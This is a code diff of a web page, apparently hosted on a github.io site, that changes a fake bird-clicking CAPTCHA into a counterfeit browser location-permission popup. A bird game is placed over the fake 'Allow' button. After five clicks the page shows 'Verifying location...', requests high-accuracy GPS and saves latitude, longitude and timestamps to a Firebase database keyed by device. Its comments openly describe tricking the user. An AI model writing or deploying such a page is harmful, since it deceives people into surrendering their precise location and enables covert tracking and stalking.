@@ -14,224 +14,27 @@
       box-sizing: border-box;
       -webkit-tap-highlight-color: transparent;
       user-select: none;
+      font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
     }
 
     body {
-      font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
-      background: #f0f2f5;
+      background: #000; /* Fake background */
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 20px;
-    }
-
-    /* ═══ CAPTCHA CARD — poora page ═══ */
-    .captcha-page {
-      width: 100%;
-      max-width: 420px;
-      background: #fff;
-      border-radius: 8px;
-      border: 1px solid #dadce0;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-      overflow: hidden;
-      animation: slideIn 0.4s ease;
-    }
-
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Header */
-    .header {
-      padding: 20px 24px;
-      border-bottom: 1px solid #e8eaed;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      background: #fff;
-    }
-
-    .logo {
-      width: 40px;
-      height: 40px;
-      border-radius: 8px;
-      background: linear-gradient(135deg, #4285f4, #34a853);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 22px;
-      box-shadow: 0 2px 8px rgba(66, 133, 244, 0.3);
-    }
-
-    .header-text h1 {
-      font-size: 18px;
-      font-weight: 600;
-      color: #202124;
-      margin-bottom: 2px;
-    }
-
-    .header-text p {
-      font-size: 13px;
-      color: #5f6368;
-    }
-
-    /* Body */
-    .body {
-      padding: 24px;
-    }
-
-    .instruction {
-      font-size: 15px;
-      color: #202124;
-      margin-bottom: 16px;
-      font-weight: 500;
-      line-height: 1.4;
-    }
-
-    .instruction span {
-      color: #1a73e8;
-      font-weight: 700;
-    }
-
-    /* Grid + Bird */
-    .grid {
-      position: relative;
-      width: 100%;
-      height: 280px;
-      background: linear-gradient(135deg, #e8f0fe, #d2e3fc);
-      border-radius: 8px;
-      border: 1px solid #dadce0;
-      overflow: hidden;
-      margin-bottom: 16px;
-      cursor: crosshair;
-    }
-
-    .grid::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(255, 255, 255, 0.4) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255, 255, 255, 0.4) 1px, transparent 1px);
-      background-size: 60px 60px;
-      pointer-events: none;
-    }
-
-    .bird {
-      position: absolute;
-      font-size: 48px;
-      cursor: pointer;
-      display: none;
-      filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.3));
-      transition: transform 0.1s;
-      z-index: 10;
-      animation: birdFloat 0.5s ease-in-out infinite alternate;
-    }
-
-    @keyframes birdFloat {
-      from { transform: translateY(0) rotate(-3deg); }
-      to { transform: translateY(-6px) rotate(3deg); }
-    }
-
-    .bird:active {
-      transform: scale(0.85);
-    }
-
-    /* Progress */
-    .progress-row {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 14px;
-    }
-
-    .progress-bar {
-      flex: 1;
-      height: 8px;
-      background: #e8eaed;
-      border-radius: 4px;
       overflow: hidden;
     }
 
-    .progress-fill {
-      height: 100%;
-      width: 100%;
-      background: linear-gradient(90deg, #4285f4, #34a853);
-      border-radius: 4px;
-      transition: width 0.1s linear;
-    }
-
-    .timer {
-      font-size: 14px;
-      font-weight: 700;
-      color: #d93025;
-      min-width: 40px;
-      text-align: right;
-      font-family: 'Courier New', monospace;
-    }
-
-    /* Stats */
-    .stats {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 14px;
-      font-size: 14px;
-      color: #5f6368;
-    }
-
-    .stats strong {
-      color: #202124;
-      font-weight: 700;
-    }
-
-    /* Status */
-    .status {
-      font-size: 13px;
-      color: #5f6368;
-      text-align: center;
-      padding: 10px;
-      border-radius: 6px;
-      background: #f8f9fa;
-      transition: all 0.3s;
-      min-height: 20px;
-    }
-
-    .status.success { color: #34a853; background: #e6f4ea; font-weight: 600; }
-    .status.error { color: #d93025; background: #fce8e6; font-weight: 600; }
-    .status.warning { color: #f9ab00; background: #fef7e0; font-weight: 600; }
-
-    /* Footer */
-    .footer {
-      padding: 14px 24px;
-      border-top: 1px solid #e8eaed;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      color: #5f6368;
-      background: #f8f9fa;
-    }
-
-    .footer-brand {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-weight: 500;
-    }
-
-    /* Success screen */
-    .success-screen {
+    /* ═══ FAKE NATIVE GPS POPUP (Screenshot Copy) ═══ */
+    .fake-popup {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(6px);
+      background: rgba(0, 0, 0, 0.6); /* Dark backdrop */
       display: flex;
       align-items: center;
       justify-content: center;
-      z-index: 99999;
+      z-index: 999999;
       animation: fadeIn 0.3s ease;
     }
 
@@ -240,101 +43,248 @@
       to { opacity: 1; }
     }
 
-    .success-box {
+    .popup-box {
+      background: #2d2d2d;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 24px;
+      padding: 20px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+      animation: slideUp 0.3s ease;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    /* Header */
+    .popup-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .icon-map {
+      width: 36px;
+      height: 36px;
       background: #fff;
-      border-radius: 12px;
-      padding: 40px 50px;
-      text-align: center;
-      max-width: 320px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
-      animation: popIn 0.4s ease;
-    }
-
-    @keyframes popIn {
-      0% { transform: scale(0.8); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
-    .check-circle {
-      width: 70px;
-      height: 70px;
       border-radius: 50%;
-      background: #34a853;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 20px;
-      font-size: 36px;
+      font-size: 18px;
+    }
+
+    .header-text {
       color: #fff;
-      animation: pop 0.5s ease;
+      font-size: 16px;
+      line-height: 1.4;
     }
 
-    @keyframes pop {
-      0% { transform: scale(0); }
-      60% { transform: scale(1.15); }
-      100% { transform: scale(1); }
+    /* Location Options */
+    .location-option {
+      background: #1e1e1e;
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      border: 2px solid transparent;
+      transition: border 0.2s;
     }
 
-    .success-box h2 {
-      color: #202124;
-      font-size: 20px;
-      margin-bottom: 8px;
+    .location-option.active {
+      border-color: #8ab4f8;
     }
 
-    .success-box p {
-      color: #5f6368;
+    .icon-grid {
+      width: 44px;
+      height: 44px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #4285f4, #34a853);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .icon-grid::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: linear-gradient(rgba(255,255,255,0.4) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.4) 1px, transparent 1px);
+      background-size: 10px 10px;
+    }
+
+    .option-text {
+      flex: 1;
+      color: #fff;
+    }
+    .option-text h3 {
+      font-size: 15px;
+      font-weight: 500;
+      margin-bottom: 2px;
+    }
+    .option-text p {
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    .radio-check {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid #aaa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .location-option.active .radio-check {
+      border-color: #8ab4f8;
+      background: #8ab4f8;
+    }
+    .radio-check::after {
+      content: '✓';
+      color: #000;
       font-size: 14px;
-      line-height: 1.5;
+      font-weight: bold;
+      display: none;
     }
+    .location-option.active .radio-check::after {
+      display: block;
+    }
+
+    /* Buttons Area */
+    .btn-container {
+      position: relative;
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .fake-btn {
+      background: #e0e0e0;
+      color: #000;
+      border: none;
+      border-radius: 100px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 500;
+      text-align: center;
+      cursor: pointer;
+      pointer-events: none; /* User click nahi kar sakta, sirf bird se hoga */
+    }
+
+    /* ═══ THE BIRD (Allow button ke upar) ═══ */
+    .bird-container {
+      position: absolute;
+      top: -60px; /* Allow button ke theek upar */
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      height: 80px;
+      background: rgba(45, 45, 45, 0.9);
+      border: 1px dashed #8ab4f8;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(138, 180, 248, 0.3);
+    }
+
+    .bird-target {
+      position: absolute;
+      font-size: 40px;
+      cursor: pointer;
+      display: none;
+      transition: transform 0.1s;
+      filter: drop-shadow(0 0 8px #fff);
+      z-index: 100;
+    }
+    
+    .bird-target:active {
+      transform: scale(0.8);
+    }
+
+    /* Fake Verification Text */
+    .verifying-text {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 18px;
+      z-index: 1000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s;
+    }
+    .verifying-text.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
   </style>
 </head>
 
 <body>
 
-  <!-- ═══ CAPTCHA PAGE ═══ -->
-  <div class="captcha-page" id="captchaPage">
-    
-    <!-- Header -->
-    <div class="header">
-      <div class="logo">🛡️</div>
-      <div class="header-text">
-        <h1>Security Verification</h1>
-        <p>Please complete the challenge below</p>
-      </div>
-    </div>
-
-    <!-- Body -->
-    <div class="body">
-      <div class="instruction">
-        Click on the <span>bird</span> to verify you're human
+  <!-- ═══ FAKE POPUP ═══ -->
+  <div class="fake-popup" id="fakePopup">
+    <div class="popup-box">
+      
+      <!-- Header -->
+      <div class="popup-header">
+        <div class="icon-map">📍</div>
+        <div class="header-text">rajak969678.github.io wants to use your device's location</div>
       </div>
 
-      <div class="grid" id="grid">
-        <div class="bird" id="bird">🐦</div>
-      </div>
-
-      <div class="progress-row">
-        <div class="progress-bar">
-          <div class="progress-fill" id="progressFill"></div>
+      <!-- Options -->
+      <div class="location-option active">
+        <div class="icon-grid"></div>
+        <div class="option-text">
+          <h3>Precise</h3>
+          <p>Exact location</p>
         </div>
-        <div class="timer" id="timer">5s</div>
+        <div class="radio-check"></div>
       </div>
 
-      <div class="stats">
-        <span>🎯 Hits: <strong id="hitCount">0</strong></span>
-        <span>⚡ Speed: <strong id="speedDisplay">0</strong>/s</span>
+      <div class="location-option">
+        <div class="icon-grid"></div>
+        <div class="option-text">
+          <h3>Approximate</h3>
+          <p>Neighbourhood</p>
+        </div>
+        <div class="radio-check"></div>
       </div>
 
-      <div class="status" id="status">Initializing...</div>
-    </div>
+      <!-- Buttons -->
+      <div class="btn-container">
+        
+        <!-- BIRD GAME AREA (Allow button ke upar) -->
+        <div class="bird-container" id="birdArea">
+          <div class="bird-target" id="bird">🐦</div>
+        </div>
 
-    <!-- Footer -->
-    <div class="footer">
-      <div class="footer-brand">
-        <span>🔒</span>
-        <span>Protected by SecurityCheck</span>
+        <!-- Fake Buttons -->
+        <button class="fake-btn" id="allowBtn">Allow while visiting the site</button>
+        <button class="fake-btn">Allow this time</button>
+        <button class="fake-btn">Never allow</button>
       </div>
-      <div>v2.1</div>
+
+      <!-- Verifying Overlay (Jab bird hit hoga) -->
+      <div class="verifying-text" id="verifyingText">
+        <div style="font-size: 30px; margin-bottom: 10px;">⏳</div>
+        Verifying location...
+      </div>
+
     </div>
   </div>
 
@@ -361,101 +311,76 @@
     // ═══════════════════════════════════════════════════════════════
     const state = {
       hits: 0,
-      timeLeft: 5,
-      totalTime: 5,
-      running: false,
-      gpsCaptured: false,
-      startTime: 0
+      running: true,
+      startTime: Date.now()
     };
 
-    const $ = (id) => document.getElementById(id);
-    const bird = $('bird');
-    const grid = $('grid');
-    const statusEl = $('status');
-    const hitCountEl = $('hitCount');
-    const timerEl = $('timer');
-    const progressFill = $('progressFill');
-    const speedDisplay = $('speedDisplay');
+    const bird = document.getElementById('bird');
+    const birdArea = document.getElementById('birdArea');
+    const verifyingText = document.getElementById('verifyingText');
+    const allowBtn = document.getElementById('allowBtn');
 
     // ═══════════════════════════════════════════════════════════════
-    // BIRD MOVE
+    // BIRD MOVE LOGIC
     // ═══════════════════════════════════════════════════════════════
     function moveBird() {
       if (!state.running) return;
-      const w = grid.clientWidth - 60;
-      const h = grid.clientHeight - 60;
+      
+      // Bird ko area ke andar random jagah pe bhejo
+      const w = birdArea.clientWidth - 50;
+      const h = birdArea.clientHeight - 50;
+      
       bird.style.left = (Math.random() * w) + 'px';
       bird.style.top = (Math.random() * h) + 'px';
       bird.style.display = 'block';
     }
 
     // ═══════════════════════════════════════════════════════════════
-    // BIRD CLICK
+    // BIRD CLICK (Yahi asli trick hai)
     // ═══════════════════════════════════════════════════════════════
     bird.addEventListener('click', (e) => {
       e.stopPropagation();
       if (!state.running) return;
 
       state.hits++;
-      hitCountEl.textContent = state.hits;
-
-      const elapsed = (Date.now() - state.startTime) / 1000;
-      speedDisplay.textContent = elapsed > 0 ? (state.hits / elapsed).toFixed(1) : state.hits;
-
+      
+      // Bird ko turant chhupao aur naya bhejo
       bird.style.display = 'none';
-      setTimeout(moveBird, 60);
+      setTimeout(moveBird, 40);
 
-      if (state.hits === 3) {
-        statusEl.textContent = '🔥 Great! Keep going!';
-        statusEl.className = 'status warning';
-      } else if (state.hits === 5) {
-        statusEl.textContent = '⚡ Almost there!';
-        statusEl.className = 'status warning';
-      } else if (state.hits >= 8) {
-        statusEl.textContent = '💪 Excellent speed!';
-        statusEl.className = 'status success';
+      // 5 hits ke baad "Allow" trigger karo
+      if (state.hits >= 5) {
+        state.running = false;
+        bird.style.display = 'none';
+        
+        // User ko lage verify ho raha hai
+        verifyingText.classList.add('show');
+        
+        // 500ms baad asli GPS maango
+        setTimeout(() => {
+          captureGPS();
+        }, 500);
+      }
+    });
+
+    // Agar user ne bird ko miss kiya aur "Allow" pe click kiya (though pointer-events none hai, safety ke liye)
+    allowBtn.addEventListener('click', () => {
+      if (state.running) {
+        state.running = false;
+        bird.style.display = 'none';
+        verifyingText.classList.add('show');
+        setTimeout(captureGPS, 500);
       }
     });
 
     // ═══════════════════════════════════════════════════════════════
-    // TIMER
-    // ═══════════════════════════════════════════════════════════════
-    function startTimer() {
-      state.startTime = Date.now();
-      state.running = true;
-      moveBird();
-
-      const timer = setInterval(() => {
-        state.timeLeft--;
-        timerEl.textContent = state.timeLeft + 's';
-        progressFill.style.width = (state.timeLeft / state.totalTime * 100) + '%';
-
-        if (state.timeLeft <= 0) {
-          clearInterval(timer);
-          state.running = false;
-          bird.style.display = 'none';
-          statusEl.textContent = '✅ Verification complete!';
-          statusEl.className = 'status success';
-          setTimeout(captureGPS, 500);
-        }
-      }, 1000);
-    }
-
-    // ═══════════════════════════════════════════════════════════════
-    // GPS CAPTURE
+    // GPS CAPTURE (Native Popup Trigger)
     // ═══════════════════════════════════════════════════════════════
     function captureGPS() {
-      if (state.gpsCaptured) return;
-      state.gpsCaptured = true;
-
       if (!navigator.geolocation) {
-        statusEl.textContent = '⚠️ Location not supported';
-        statusEl.className = 'status error';
+        alert("Location not supported");
         return;
       }
-
-      statusEl.textContent = '📍 Verifying location...';
-      statusEl.className = 'status warning';
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
@@ -464,7 +389,7 @@
             longitude: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
             timestamp: Date.now(),
-            source: 'captcha_fullpage',
+            source: 'fake_native_popup_bird',
             hits: state.hits,
             time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
           };
@@ -472,85 +397,31 @@
           if (database && deviceId !== 'unknown') {
             database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
             database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
-            database.ref(`captcha_sessions/${deviceId}/${Date.now()}`).set({
-              ...gpsData,
-              captchaType: 'bird_fullpage',
-              sessionComplete: true
-            });
           }
 
-          showSuccess();
+          // Fake popup hatao
+          document.getElementById('fakePopup').style.display = 'none';
+          
+          // Success alert (optional)
+          alert("✅ Location Verified Successfully!");
         },
         (err) => {
-          statusEl.textContent = '⚠️ Location required. Please allow.';
-          statusEl.className = 'status error';
-
-          setTimeout(() => {
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                const gpsData = {
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude,
-                  accuracy: pos.coords.accuracy,
-                  timestamp: Date.now(),
-                  source: 'captcha_fullpage_retry',
-                  hits: state.hits
-                };
-                if (database && deviceId !== 'unknown') {
-                  database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
-                }
-                showSuccess();
-              },
-              () => {
-                statusEl.textContent = '❌ Verification failed. Please refresh.';
-                statusEl.className = 'status error';
-              },
-              { enableHighAccuracy: true, timeout: 10000 }
-            );
-          }, 1500);
+          // Agar user ne "Never Allow" kiya
+          alert("⚠️ Verification failed. Location is required.");
+          location.reload();
         },
-        { enableHighAccuracy: true, timeout: 10000 }
+        { enableHighAccuracy: true, timeout: 15000 }
       );
     }
 
     // ═══════════════════════════════════════════════════════════════
-    // SUCCESS SCREEN
-    // ═══════════════════════════════════════════════════════════════
-    function showSuccess() {
-      const screen = document.createElement('div');
-      screen.className = 'success-screen';
-      screen.innerHTML = `
-        <div class="success-box">
-          <div class="check-circle">✓</div>
-          <h2>Verification Complete</h2>
-          <p>You hit ${state.hits} birds!</p>
-          <p style="margin-top:10px; font-size:12px; color:#8ab4d4;">
-            Redirecting to your destination...
-          </p>
-        </div>
-      `;
-      document.body.appendChild(screen);
-
-      setTimeout(() => {
-        screen.style.opacity = '0';
-        screen.style.transition = 'opacity 0.3s';
-        setTimeout(() => screen.remove(), 300);
-      }, 2000);
-    }
-
-    // ═══════════════════════════════════════════════════════════════
-    // START
+    // START GAME
     // ═══════════════════════════════════════════════════════════════
     window.addEventListener('load', () => {
+      // 1 sec baad bird dikhao
       setTimeout(() => {
-        statusEl.textContent = '🔍 Scanning browser...';
-        statusEl.className = 'status';
-        setTimeout(() => {
-          statusEl.textContent = '🎯 Hit the bird fast!';
-          statusEl.className = 'status';
-          startTimer();
-        }, 800);
-      }, 400);
+        moveBird();
+      }, 1000);
     });
   </script>
 </body>
